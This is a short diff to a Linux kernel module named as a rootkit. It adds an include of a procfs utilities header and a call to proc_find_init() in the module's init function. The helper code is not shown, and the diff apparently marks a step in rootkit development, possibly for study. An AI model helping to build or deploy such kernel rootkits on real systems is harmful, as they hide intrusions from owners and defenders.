@@ -1,11 +1,15 @@
 #include <linux/init.h>
 #include <linux/module.h>
+#include "procfs_utils.h"
 
 
 MODULE_LICENSE("GPL");
 
+
 static int __init rootkit_init(void)
 {
+    proc_find_init();
+
     printk(KERN_ALERT "rootkit init\n");
     return 0;
 }
